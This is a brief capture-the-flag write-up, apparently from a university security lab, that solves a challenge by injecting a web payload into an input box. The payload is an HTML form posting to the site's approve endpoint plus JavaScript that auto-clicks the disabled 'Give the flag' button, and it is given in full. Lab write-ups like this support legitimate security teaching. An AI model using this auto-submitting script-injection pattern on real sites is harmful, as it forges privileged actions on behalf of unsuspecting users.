## Apply for flag 2

When we open the site we are presented with our `id` for every request needed and there's a input box with a submit button.

Once we submit any text we're redireted to another page. There's a link to a `page` and when clicked it fowards us to another page with two buttons `Give the flag` and `Mark request as read`.
- To activate the `Give the flag` button we need to send a form by post with our `id` to the link that the existing button already sends ("http://ctf-fsi.fe.up.pt:5005/request/" + id + "/approve").
- As this button is disable we need to make a script to click it, so this is the form and script we will submit on the first page where there is an input box:
```<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/8faa3db714efe9a28f9d38ff65cb2afb58bc10bc/approve" role="form">          
    <div class="submit">                  
        <input type="submit" id="giveflag" value="Give the flag">   
    </div>  
</form>    

<script type="text/javascript"> 
    document.getElementById('giveflag').click();  
</script>```

